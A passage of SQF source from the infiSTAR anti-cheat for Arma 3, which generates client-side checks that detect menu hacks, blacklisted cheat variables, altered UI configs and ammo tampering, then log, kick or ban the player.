							_puid = getPlayerUID player;
							if!(_puid isEqualTo '')then
							{
								_varuid = missionNameSpace getVariable[format['UID_BY_ID_%1',_markerid],'-1'];
								if(_puid isEqualTo _varuid)then
								{
									deleteMarker _marker;
									_log = 'Deleted drawing on a global channel!';
									systemChat ('<infiSTAR.de> '+_log);
									if(_need_hlog)then
									{
										[_name,_varuid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
									};
									_need_hlog = false;
								};
							};
						}
						else
						{
							_varname = missionNameSpace getVariable[format['NAME_BY_ID_%1',_markerid],''];
							_markerText = markerText _marker;
							if(_markerText isEqualTo '')then
							{
								_marker setMarkerText format['%1: no marker text',_varname];
							}
							else
							{
								_addition = format['%1: ',_varname];
								if((_markerText find _addition) isEqualTo -1)then
								{
									_marker setMarkerText (_addition+_markerText);
								};
							};
						};
					};
				} forEach allMapMarkers;
			};


            "; if(_useTildMenu)then{ _A3AHstring = _A3AHstring + "
            if(isNil'"+_customcommandingMenu+"')then
            {
                _log = 'customcommandingMenu is Nil';
                [_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
                [] spawn "+_AHKickOFF+";
            }
            else
            {
                if!(str "+_customcommandingMenu+" isEqualTo str _customcommandingMenu)then
                {
                    _log = format['customcommandingMenu changed: %1',"+_customcommandingMenu+"];
                    [_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
                    [] spawn "+_AHKickOFF+";
                };
            };
            "; }; _A3AHstring = _A3AHstring + "


			"; if(_CLG)then{ _A3AHstring = _A3AHstring + "
			if(isNil '"+_inCombatTime+"')then{"+_inCombatTime+" = 0;};
			_combatTime = round(time - "+_inCombatTime+");
			if(_combatTime <= 30)then
			{
				if(_inCombat == 0)then
				{
					_inCombat = 1;
					[_name,_puid,'COMBATCHECK',_inCombat] call "+_AH1311KICKLOG+";
				};
			}
			else
			{
				if(_inCombat == 1)then
				{
					_inCombat = 0;
					[_name,_puid,'COMBATCHECK',_inCombat] call "+_AH1311KICKLOG+";
				};
			};
			if!(_tmpObj isEqualTo (vehicle player))then
			{
				_tmpObj = (vehicle player);
				player removeAllEventHandlers 'Hit';
				player removeAllEventHandlers 'FiredNear';
				if(alive player)then
				{
					player addEventHandler ['Hit',{"+_inCombatTime+" = time}];
					player addEventHandler ['FiredNear',{"+_inCombatTime+" = time}];
				};
			};
			if(!alive player)then
			{
				"+_inCombatTime+" = 0;
			};
			"; }; _A3AHstring = _A3AHstring + "
			_display49 = findDisplay 49;
			if!(serverCommandAvailable '#logout')then
			{
				if(!isNull _display49)then
				{
					if(_49openedTimer == 0)then{_49openedTimer = time;};
					"; if(_CLG)then{ _A3AHstring = _A3AHstring + "
					if(_combatTime < 30)then
					{
						(_display49 displayCtrl 104) ctrlEnable false;
						(_display49 displayCtrl 104) ctrlSetText format['COMBAT time: %1',30-_combatTime];
					}
					else
					{
					"; }; _A3AHstring = _A3AHstring + "
					"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
						_waitTime = time - _49openedTimer;
						if(_waitTime < 10)then
						{
							(_display49 displayCtrl 104) ctrlEnable false;
							"; if(_CLG)then{ _A3AHstring = _A3AHstring + "
							(_display49 displayCtrl 104) ctrlSetText format['ABORT IN %1',ceil(10-_waitTime)];
							"; }; _A3AHstring = _A3AHstring + "
						}
						else
						{
							(_display49 displayCtrl 104) ctrlEnable true;
							"; if(_CLG)then{ _A3AHstring = _A3AHstring + "
							(_display49 displayCtrl 104) ctrlSetText 'Abort';
							"; }; _A3AHstring = _A3AHstring + "
						};
					"; }; _A3AHstring = _A3AHstring + "
					"; if(_CLG)then{ _A3AHstring = _A3AHstring + "
					};
					"; }; _A3AHstring = _A3AHstring + "
					(_display49 displayCtrl 2) ctrlEnable false;
					(_display49 displayCtrl 2) ctrlSetText "+str _ESCMNUTOP+";
					(_display49 displayCtrl 103) ctrlEnable false;
					(_display49 displayCtrl 103) ctrlSetText "+str _ESCMNUBOT+";
					(_display49 displayCtrl 523) ctrlSetText profileName;
					(_display49 displayCtrl 109) ctrlSetText _puid;
					(_display49 displayCtrl 122) ctrlEnable false;
					(_display49 displayCtrl 122) ctrlShow false;
					"; if(_B49)then{ _A3AHstring = _A3AHstring + "
						_cnt = "; if((!_B49)&&(_MOD != 'Epoch'))then{ _A3AHstring = _A3AHstring + "{
							"; if(_B49)then{ _A3AHstring = _A3AHstring + "
							_controltype = ctrlType _x;
							if(_controltype == 16)then
							{
								_action = buttonAction _x;
								if(_action != '')then
								{
									if!(str _x in _excludedButtons)then
									{
										if((str _x == 'Control #-1')||(_action != ""(findDisplay 49) closeDisplay 0; 0 spawn {_n=  createDialog 'RHS_Options_Menu';0 spawn rhs_fnc_menuOptions;};""))then
										{
											_log = format['BadButton on 49: %1, %2',_x,_action];
											[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
											[] spawn "+_AHKickOFF+";
										};
									};
								};
							};
							"; }; _A3AHstring = _A3AHstring + "
							"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
								if!(str _x in ['Control #101','Control #1010','Control #104','Control #302','Control #301','Control #303','Control #307'])then
								{
									_x ctrlEnable false;
								};
							"; }; _A3AHstring = _A3AHstring + "
							true
						} "; }; _A3AHstring = _A3AHstring + "count (allcontrols _display49);
					"; }; _A3AHstring = _A3AHstring + "
					
					if!(_puid in _admins)then
					{
						{
							_ctrl = _display49 displayCtrl _x;
							_ctrl ctrlShow false;
							_ctrl buttonSetAction '(findDisplay 49) closeDisplay 0;(findDisplay 46) closeDisplay 0;';
						} forEach [11884,12284,13291];
						{
							_ctrl = _display49 displayCtrl _x;
							_ctrl ctrlShow false;
							_ctrl buttonSetAction '(findDisplay 49) closeDisplay 0;(findDisplay 46) closeDisplay 0;';
							if(!isNull _ctrl)then
							{
								_log = format['BadControl on 49: %1 - %2',_ctrl,_x];
								[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							};
						} forEach [65464,65465,65466];
					};
				}
				else
				{
					_49openedTimer = 0;
				};
			};
			if(!isNull _display49)then
			{
				"; if(!_BRIEFING_MSG)then{ _A3AHstring = _A3AHstring + "
				(_display49 displayCtrl 120) ctrlSetText 'infiSTAR.de AntiHack & AdminsTools - [Author: infiSTAR, Contact: infiSTAR23@gmail.com]';
				"; }else{ _A3AHstring = _A3AHstring + "
				(_display49 displayCtrl 115025) ctrlSetText 'AntiHack & AdminsTools';
				(_display49 displayCtrl 115035) ctrlSetText 'by infiSTAR.de';
				"; }; _A3AHstring = _A3AHstring + "
			};



{
	_buttonAction = buttonAction _x;
	if!(_buttonAction isEqualTo '')then
	{
		_log = format['MenuBasedHack :: 24 :: %1 :: %2',_x,_buttonAction];
		[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
		[] spawn "+_AHKickOFF+";
	};
} forEach allControls(finddisplay 24);

{
	if(!isNull ((findDisplay 24) displayCtrl _x))then
	{
		_log = format['MenuBasedHack :: 24 :: %1',_x];
		[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
		[] spawn "+_AHKickOFF+";
	};
} forEach [2406,2407,2408,2409,2410,2411,2412,2443,2442,2441];
(findDisplay 24) displayRemoveEventHandler ['KeyUp',_chatKeyUp_id];
_chatKeyUp_id = (finddisplay 24) displayAddEventHandler ['KeyUp',_chatKeyUp];






			"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
				if(!isNull player)then
				{
					if(alive player)then
					{
						{
							player removeAllEventHandlers _x;
							player addEventHandler [_x,(['CfgEpochClient', _x, ''] call EPOCH_fnc_returnConfigEntryV2)];
						} forEach _playerhandlers;
					};
					
					"; if(_UAG)then{ _A3AHstring = _A3AHstring + "
					if(animationState player == 'amovpercmsprsnonwnondf_amovppnemstpsnonwnondnon')then
					{
						_ct = cursorTarget;
						if(!isNull _ct)then
						{
							if((_ct isKindOf 'Constructions_static_F') && (_ct distance player < 4))then
							{
								if(time - _lastglitch > 45)then{_wallgames = 0;};
								_lastglitch = time;
								player switchMove '';
								player setVelocity [0,0,0];
								if(_wallgames >= 1)then
								{
									player setHitPointDamage ['HitLegs',1];
									_log = format['Anti-Glitch: %1 triggered %2 times @%3 (LEGS BROKEN)',typeOf _ct,_wallgames,mapGridPosition player];
									[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
								};
								if(_wallgames >= 2)then
								{
									player setPos [0,0,100];
									{player setHitPointDamage [_x,1];} forEach ['HitBody','HitHead'];
									_log = format['Anti-Glitch: %1 triggered %2 times @%3 (KILLED THE GLITCHER)',typeOf _ct,_wallgames,mapGridPosition player];
									[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
									_wallgames = 0;
									[] spawn "+_AHKickOFF+";
								};
								_wallgames = _wallgames + 1;
								_msg = 'NO GLITCHING';
								hint _msg;
								1 cutText [format ['%1',_msg],'WHITE IN'];
								systemChat _msg;
							};
						};
					};
				};
				"; }; _A3AHstring = _A3AHstring + "
			"; }; _A3AHstring = _A3AHstring + "
			if(isNull _display49)then{uiSleep 0.2;};


            "; if(_useTildMenu)then{ _A3AHstring = _A3AHstring + "
            if(!isNil'"+_customcommandingMenuOpen+"')then
            {
				_cmd_open_timer = diag_tickTime + 5;
				waitUntil{
					hint format['opening menu in: %1s if your game crahes, do not use this function again..! #ArmaBugs',_cmd_open_timer - diag_tickTime];
					diag_tickTime > _cmd_open_timer
				};
				"+_customcommandingMenuOpen+" = nil;
				showCommandingMenu '#USER:"+_customcommandingMenu+"';
            };
            "; }; _A3AHstring = _A3AHstring + "


			"; if((_MOD == 'Epoch')&&(_AWL))then{ _A3AHstring = _A3AHstring + "
				if(player == vehicle player)then
				{
					_intersectsWith = [];
					
					_eyeDir = eyedirection player;
					_wepDir = player weapondirection currentweapon player;
					
					_vectorDiff = _eyeDir vectorDiff _wepDir;
					_xdif = abs(_vectorDiff select 0);
					
					if((inputAction 'EvasiveLeft' > 0)||(inputAction 'EvasiveRight' > 0)||(_eyeDir select 2 > 0.5)||(_xdif > 0.55))then
					{
						_eyePos = eyepos player;
						_dir_weapon_r = (((_wepDir) select 0) atan2 ((_wepDir) select 1))+45;
						_dir_weapon_l = (((_wepDir) select 0) atan2 ((_wepDir) select 1))-25;
						
						_intersectsWith = lineintersectswith [[(_eyePos select 0) + (_eyeDir select 0)*_dis_head,(_eyePos select 1) + (_eyeDir select 1)*_dis_head,(_eyePos select 2) + (_eyeDir select 2)*_dis_head], _eyePos, player];
						_intersectsWith append lineintersectswith [[(_eyePos select 0) + _dis_weapon_r*sin _dir_weapon_r,(_eyePos select 1) + _dis_weapon_r*cos _dir_weapon_r,(_eyePos select 2)], _eyePos, player];
						_intersectsWith append lineintersectswith [[(_eyePos select 0) + _dis_weapon_l*sin _dir_weapon_l,(_eyePos select 1) + _dis_weapon_l*cos _dir_weapon_l,(_eyePos select 2)], _eyePos, player];
						
						_plrPosVisual = ATLtoASL (player modelToWorldVisual [0,0,0]);
						_intersectsWith append lineIntersectsWith [_eyePos, _plrPosVisual];
					};
					
					if(_intersectsWith isEqualTo [])then
					{
						if(_faded)then{_faded=false;TitleText ['AntiHack by infiSTAR.de','PLAIN DOWN'];};
					}
					else
					{
						{
							if(_x isKindOf 'Const_All_Walls_F')exitWith{call _fadeOut};
							if(_x isKindOf 'Const_WoodWalls_static_F')exitWith{call _fadeOut};
							if(_faded)exitWith{};
						} forEach _intersectsWith;
					};
				};
			"; }; _A3AHstring = _A3AHstring + "
		};
		_log = 'Loop #0 ended!';
		[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
		[] spawn "+_AHKickOFF+";
	};
	[_name,_puid,_admins] spawn {
		_name = _this select 0;
		_puid = _this select 1;
		_admins = _this select 2;
		"; if(_USE_RESTART_TIMER)then{ _A3AHstring = _A3AHstring + "
			_restartTime = "+str _RESTART_TIME_IN_M+";
			_msgTimes = "+str _SHOW_TIMER_IN_MIN+";
			_msgFormat = '<t size=''0.70'' color=''#DA1700'' align=''right''>RESTART IN %1 MINS</t>';
		"; }; _A3AHstring = _A3AHstring + "
		"; if(_UOL)then{ _A3AHstring = _A3AHstring + "
			_server_onLoadUnload1 = "+str _onLoadUnload1+";
			_server_onLoadUnload2 = "+str _onLoadUnload2+";
			_server_onLoadUnload3 = "+str _onLoadUnload3+";
		"; }; _A3AHstring = _A3AHstring + "
		while{1==1}do
		{
			"; if(_UOL)then{ _A3AHstring = _A3AHstring + "
				{
					_onLoad = toArray(getText(configFile >> _x >> 'onLoad'));
					_server_onLoad = _server_onLoadUnload2 select _forEachIndex;
					if(!(_onLoad isEqualTo _server_onLoad) && !(_onLoad isEqualTo ''))then
					{
						_log = format['onLoad changed: %1, %2, %3',_x,toString _onLoad,toString _server_onLoad];
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
					_onUnload = toArray(getText(configFile >> _x >> 'onUnload'));
					_server_onUnload = _server_onLoadUnload3 select _forEachIndex;
					if(!(_onUnload isEqualTo _server_onUnload) && !(_onUnload isEqualTo ''))then
					{
						_log = format['onUnload changed: %1, %2, %3',_x,toString _onUnload,toString _server_onUnload];
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
				} forEach _server_onLoadUnload1;
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_UMP)then{ _A3AHstring = _A3AHstring + "
				uiSleep 1;
				_children = [configFile >> 'RscDisplayMPInterrupt' >> 'controls',0] call BIS_fnc_returnChildren;
				_allowedChildren = ['Title','MissionTitle','DifficultyTitle','PlayersName','ButtonCancel','ButtonSAVE','ButtonSkip','ButtonRespawn','ButtonOptions','ButtonVideo','ButtonAudio','ButtonControls','ButtonGame','ButtonTutorialHints','ButtonAbort','DebugConsole','Feedback','MessageBox','CBA_CREDITS_M_P','CBA_CREDITS_CONT_C','Version','TrafficLight','TraffLight'];
				{
					_cfgName = configName _x;
					if(!(_cfgName in _allowedChildren))then
					{
						_log = format['Modified MPInterrupt: %1 | %2',_x,_cfgName];
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
				} forEach _children;
				uiSleep 1;
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_USE_RESTART_TIMER)then{ _A3AHstring = _A3AHstring + "
				_currentmessagetime = (_restartTime - round(serverTime / 60));
				if(_currentmessagetime in _msgTimes)then
				{
					_msgTimes = _msgTimes - [_currentmessagetime];
					[
						format[_msgFormat, _restartTime - round(serverTime / 60)],
						[safezoneX + safezoneW - 0.8,0.50],
						[safezoneY + safezoneH - 0.8,0.7],
						5,
						0.5
					] call BIS_fnc_dynamicText;
				};
			"; }; _A3AHstring = _A3AHstring + "
			uiSleep 8;
		};
		_log = 'Loop #3 ended!';
		[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
		[] spawn "+_AHKickOFF+";
	};
	
	_isNormal = true;
	if(_puid in _admins)then
	{
		_isNormal = false;
		if!(_puid in "+_adminsA+")then
		{
			_isNormal = true;
		};
	};
	if(_isNormal)then
	{
		"; if((_UBV)||(_UBV2))then{ _A3AHstring = _A3AHstring + "
			[_name,_puid,_admins] spawn {
				_name = _this select 0;
				_puid = _this select 1;
				_admins = _this select 2;
				_isAdmin = false;
				if(_puid in _admins)then{_isAdmin = true;};
				"; if(_UBV)then{ _A3AHstring = _A3AHstring + "
					_blacklistedVariables = "+str _blacklistedVariables+";
					_blacklistedVariables append ['JoinOrNotJoinIsTheQuestion','noRecoilRun','A3FFrun'];
					if(_isAdmin)then
					{
						{
							_missionNamespace = missionNamespace getVariable _x;
							if(!isNil '_missionNamespace')then
							{
								missionNamespace setVariable[_x,nil];
							};
							_uiNamespace = uiNamespace getVariable _x;
							if(!isNil '_uiNamespace')then
							{
								uiNamespace setVariable[_x,nil];
							};
							_profileNamespace = profileNamespace getVariable _x;
							if(!isNil '_profileNamespace')then
							{
								profileNamespace setVariable[_x,nil];
							};
						} forEach _blacklistedVariables;
						saveProfileNamespace;
					};
				"; }; _A3AHstring = _A3AHstring + "
				"; if(_UBV2)then{ _A3AHstring = _A3AHstring + "
					_lastTimeCheckedVars = time + 80;
					_alreadyCheckedVariables = "+str _allRandomGenVars+";
					_alreadyCheckedVariables append "+str _badVarWhitelistReal+";
					_alreadyCheckedVariables append ['fnc_sendmsgtoplr','bpdcode','ruhr_fnc_emptyfuel','"+_AH_AdmiLogArrayRND+"'];
				"; }; _A3AHstring = _A3AHstring + "
				while{1==1}do
				{
					_timer1 = time;
					"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
						_avpnamespace = (allVariables parsingNamespace);
						if!(_avpnamespace isEqualTo [])then
						{
							_log = 'BadVariables in parsingNamespace';
							[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
							{parsingNamespace setVariable[_x,nil];}forEach (allVariables parsingNamespace);
						};
					"; }; _A3AHstring = _A3AHstring + "

					{
						_bvc = profileNamespace getVariable [_x,0];
						if(_bvc isEqualType '')then
						{
							profileNamespace setVariable [_x,0.4];saveprofileNamespace;
							
							_log = format['VARIABLE HACKED: %1 (%2) VALUE: [%3]', _x, typeName _bvc, str _bvc];
							[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
					} forEach ['igui_bcg_rgb_a','igui_bcg_rgb_r','igui_bcg_rgb_g','igui_bcg_rgb_b','IGUI_grid_mission_X','IGUI_grid_mission_Y','IGUI_grid_mission_W','IGUI_grid_mission_H'];

					"; if(_UBV)then{ _A3AHstring = _A3AHstring + "
						{
							_vc = missionNamespace getVariable _x;
							if(!isNil _x)then
							{
								_log = format['BadVar#1: %1 - %2',_x,_vc];
								[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							}
							else
							{
								if(!isNil '_vc')then
								{
									_log = format['BadVar#1 in missionNamespace: %1 - %2',_x,_vc];
									[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
									[] spawn "+_AHKickOFF+";
								};
							};
							_vc = uiNamespace getVariable _x;
							if(!isNil '_vc')then
							{
								_log = format['BadVar#1 in uiNamespace: %1 - %2',_x,_vc];
								[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							};
							_vc = profileNamespace getVariable _x;
							if(!isNil '_vc')then
							{
								profileNamespace setVariable[_x,nil];saveProfileNamespace;
								_log = format['BadVar#1 in profileNamespace: %1 - %2',_x,_vc];
								[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							};
						} forEach _blacklistedVariables;
					"; }; _A3AHstring = _A3AHstring + "
					"; if(_UBV2)then{ _A3AHstring = _A3AHstring + "
						if(_isAdmin)then
						{
							if(time > _lastTimeCheckedVars)then
							{
								_lastTimeCheckedVars = time + 80;
								
								{
									_var = _x;
									_varid = _alreadyCheckedVariables pushBackUnique _var;
									if(_varid > -1)then
									{
										{
											if!((toLower _var) find _x isEqualTo -1)then
											{
												_log = format['BadVar#2 found %1 in %2',_x,_var];
												[profileName,getPlayerUID player,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
												[] spawn "+_AHKickOFF+";
												missionNamespace setVariable[_var,nil];
											}
											else
											{
												"; if(_UBV2C)then{ _A3AHstring = _A3AHstring + "
													_m = missionNamespace getVariable _var;
													if(!isNil '_m')then
													{
														_mstring = str _m;
														if((toLower _mstring) find _x != -1)then
														{
															_mstring = _mstring select [0,200];
															_log = format['BadVar#2 found %1 in %2: %3',_x,_var,_mstring];
															[profileName,getPlayerUID player,'SLOG',toArray(_log)] call "+_AH1311KICKLOG+";
															(findDisplay 46)closeDisplay 0;
															missionNamespace setVariable[_var,nil];
														};
													};
												"; }; _A3AHstring = _A3AHstring + "
											};
										} forEach "+str _verybadStrings+";
									};
								} forEach (allVariables missionNamespace);
							};
						};
					"; }; _A3AHstring = _A3AHstring + "
					_sleeptimer = ((time - _timer1)*2)+1;
					uiSleep _sleeptimer;
				};
				_log = 'Loop #6 ended!';
				[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
				[] spawn "+_AHKickOFF+";
			};
		"; }; _A3AHstring = _A3AHstring + "
		[_name,_puid] spawn {
			disableSerialization;
			_name = _this select 0;
			_puid = _this select 1;
			_FiredCheck = {
				_unit = _this select 0;
				_weapon = _this select 1;
				_muzzle = _this select 2;
				_mode = _this select 3;
				_ammo = _this select 4;
				_magazine = _this select 5;
				_projectile = _this select 6;
				if(("+str _UFA+") && {((!("+str _UAW+") && {_ammo in "+str _ForbiddenAmmo+"}) || (("+str _UAW+") && {!(_ammo in "+str _AmmoWhiteList+")}))})then
				{
					_log = format['ForbiddenAmmo: %1 with weapon %2',_ammo,_muzzle];
					[profileName,getPlayerUID _unit,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				if(_unit isEqualTo (vehicle _unit))then
				{
					if!(_muzzle in ['','Throw','Flare','Put'])then
					{
						if((toLower _magazine) find '3rnd_' == -1)then
						{
							_ammo_checkpassed = true;
							_lowAmmo = toLower _ammo;
							{if(_lowAmmo find _x > -1)exitWith{_ammo_checkpassed = false;};} forEach ['f_40mm','f_20mm','g_40mm','g_20mm','spear_'];
							if(_ammo_checkpassed)then
							{
								_cfgammo = getText(configFile >> 'CfgMagazines' >> _magazine >> 'ammo');
								if(_ammo != _cfgammo)then
								{
									_log = format['BadMuzzle: %1 with weapon %2',_ammo,_muzzle];
									[profileName,getPlayerUID _unit,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
									[] spawn "+_AHKickOFF+";
								};
								
								_maxAmmo = getNumber (configFile >> 'CfgMagazines' >> _magazine >> 'count');
								if(_maxAmmo > 1)then
								{
									if(isNil '"+_lastshotmade+"')then{"+_lastshotmade+" = diag_tickTime;};
									if(typeName "+_lastshotmade+" != 'SCALAR')then
									{
										_log = 'BadDefinition: -no ammo loss- check bypass!';
										[profileName,getPlayerUID _unit,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
										[] spawn "+_AHKickOFF+";
									};
									if(diag_tickTime - "+_lastshotmade+" > 0.2)then
									{
										_camm = _unit ammo _muzzle;
										if((_camm >= _maxAmmo)&&(_muzzle isEqualTo currentWeapon _unit))then
										{
											_log = format['No Ammo Loss - Removed Current Magazine: %1 %2 %3 %4',_muzzle,_magazine,_camm,_maxAmmo];
											[profileName,getPlayerUID _unit,'SLOG',toArray(_log)] call "+_AH1311KICKLOG+";
											[_muzzle,_magazine,_unit] spawn {
												(_this select 2) removeItem (_this select 0);
												(_this select 2) removeWeapon (_this select 0);
												(_this select 2) removeMagazines (_this select 1);
											};
										};
									};
									"+_lastshotmade+" = diag_tickTime;
								};
							};
						};
					};
				};
				true
			};
			"+_FiredCheck+" = compileFinal ([_FiredCheck] call "+str fnc_CompilableString+");
			_addCaseHDMGold = -1;
			_addCaseMEHold = -1;
			if(isNil 'life_fnc_keyHandler')then{life_fnc_keyHandler = {false};}else{if(typeName life_fnc_keyHandler != 'CODE')then{life_fnc_keyHandler = {false};};};
			
			"; if((_RDK) && !(_CKB))then{ _A3AHstring = _A3AHstring + "
				(findDisplay 46) displayRemoveAllEventHandlers 'KeyDown';
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_RUK)then{ _A3AHstring = _A3AHstring + "
				(findDisplay 46) displayRemoveAllEventHandlers 'KeyUp';
			"; }; _A3AHstring = _A3AHstring + "
			
			"; if(_CKB)then{ _A3AHstring = _A3AHstring + "
				_kbacaught = false;
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_RMB)then{ _A3AHstring = _A3AHstring + "
				"+_ButtonDownCnt+"=0;
				"+_ButtonDownTime+"= round diag_tickTime;
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
			_loggedOnce = false;
			"; }; _A3AHstring = _A3AHstring + "
			_RMEH = "+str _RMEH+";
			"; if(_OMC||_MBC)then{ _A3AHstring = _A3AHstring + "
				_RMEH = _RMEH - ['MouseButtonClick'];
			"; }; _A3AHstring = _A3AHstring + "
			while{1==1}do
			{
				if((!isNull (findDisplay 12))&&(visiblemap))then
				{
					{(findDisplay 12 displayCtrl 51) ctrlRemoveAllEventHandlers _x;findDisplay 12 displayRemoveAllEventHandlers _x} forEach _RMEH;
					"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
					if(!_loggedOnce)then
					{
						_selected = lbSelection ((findDisplay 12) displayCtrl 1001);
						if(!(_selected isEqualTo [2])&&!(_selected isEqualTo [3]))then
						{
							_control1 = (findDisplay 12) displayCtrl 1002;
							_size = lbSize _control1;
							if(_size > 2)then
							{
								_texts = [];
								for '_i' from 0 to (_size-1) do
								{
									_lbtxt = _control1 lbText _i;
									_texts pushBack _lbtxt;
								};
								
								_log = format['Map Sub-Menu %1 size has been changed to %2. Found: %3',_selected,_size,_texts];
								[_name,_puid,'SLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
								(findDisplay 46)closeDisplay 0;
								_loggedOnce = true;
								lbClear _control1;
							};
						};
						
						_control2 = (findDisplay 12) displayCtrl 1001;
						_size = lbSize _control2;
						if(_size > 5)then
						{
							_log = format['Map Menu has been changed %1 entries found (should be 5)',_size];
							[_name,_puid,'SLOG',toArray(_log)] call "+_AH1311KICKLOG+";
							_loggedOnce = true;
							lbClear _control2;
						};
					};
					"; }; _A3AHstring = _A3AHstring + "
				};
				"; if(_RMB)then{ _A3AHstring = _A3AHstring + "
					if(isNil'"+_ButtonDownCnt+"')then
					{
						_log = '"+_ButtonDownCnt+" is nil';
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					}
					else
					{
						if(typeName "+_ButtonDownCnt+" != 'SCALAR')then
						{
							_log = format['"+_ButtonDownCnt+" typename changed to %1, %2',typeName "+_ButtonDownCnt+","+_ButtonDownCnt+"];
							[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
					};
					if(isNil'"+_ButtonDownTime+"')then
					{
						_log = '"+_ButtonDownTime+" is nil';
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					}
					else
					{
						if(typeName "+_ButtonDownTime+" != 'SCALAR')then
						{
							_log = format['"+_ButtonDownTime+" typename changed to %1, %2',typeName "+_ButtonDownTime+","+_ButtonDownTime+"];
							[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
					};
					(findDisplay 46) displayRemoveAllEventHandlers 'MouseButtonDown';
					(findDisplay 46) displaySetEventHandler ['MouseButtonDown',""
						if(round diag_tickTime == "+_ButtonDownTime+")then
						{
							"+_ButtonDownCnt+" = "+_ButtonDownCnt+" + 1;
						}
						else
						{
							if("+_ButtonDownCnt+" >= 30)then
							{
								_ct = cursorTarget;
								if(!isNull _ct)then
								{
									if(isPlayer _ct)then
									{
										_ct = format['%1(%2) %3, %4m away',name _ct,getPlayerUID _ct,typeOf (vehicle _ct),player distance _ct];
									}
									else
									{
										_ct = format['%1, %2m away',typeOf _ct,player distance _ct];
									};
								}
								else
								{
									_ct='NO TARGET';
								};
								_log = format['Clicking speed too fast! %1 clicks in a second.. FPS: %2, Target: %3, Displays: %4',"+_ButtonDownCnt+",diag_fps,_ct,allDisplays];
								[profileName,getPlayerUID player,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
							};
							"+_ButtonDownCnt+" = 0;
						};
						"+_ButtonDownTime+"= round diag_tickTime;
					""];
				"; }; _A3AHstring = _A3AHstring + "
				{
					(findDisplay _x) displayRemoveAllEventHandlers 'MouseHolding';
				} forEach [18,46,49];
				{
					(findDisplay _x) displayRemoveAllEventHandlers 'MouseZChanged';
					(findDisplay _x) displayRemoveAllEventHandlers 'MouseMoving';
					(findDisplay _x) displayRemoveAllEventHandlers 'MouseButtonDown';
				} forEach [18,49];
				{
					(findDisplay _x) displayRemoveAllEventHandlers 'KeyDown';
					(findDisplay _x) displayRemoveAllEventHandlers 'KeyUp';
				} forEach [-1,18,49,106];
				(findDisplay 131) displayCtrl 102 ctrlRemoveallEVenthandlers 'LBDblClick';
				(findDisplay 131) displayCtrl 102 ctrlRemoveallEVenthandlers 'LBSelChanged';
				
				"; if(_RUK)then{ _A3AHstring = _A3AHstring + "
					(findDisplay 46) displayRemoveAllEventHandlers 'KeyUp';
					(findDisplay 46) displayAddEventHandler ['KeyUp',"+_fnc_infiKeyHandler+"];
					"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
						(findDisplay 46) displayAddEventHandler ['KeyUp','_this call EPOCH_KeyUp'];
					"; }; _A3AHstring = _A3AHstring + "
				"; }; _A3AHstring = _A3AHstring + "
				
				"; if(_RDK)then{ _A3AHstring = _A3AHstring + "
					(findDisplay 46) displayRemoveAllEventHandlers 'KeyDown';
					_shouldbe = 0;
					_kdID = (findDisplay 46) displayAddEventHandler ['KeyDown',"+_fnc_infiKeyHandler+"];
					"; if(_MOD == 'AltisLife')then{ _A3AHstring = _A3AHstring + "
						_shouldbe = _shouldbe + 1;
						_kdID = (findDisplay 46) displayAddEventHandler ['KeyDown','_this call life_fnc_keyHandler;'];
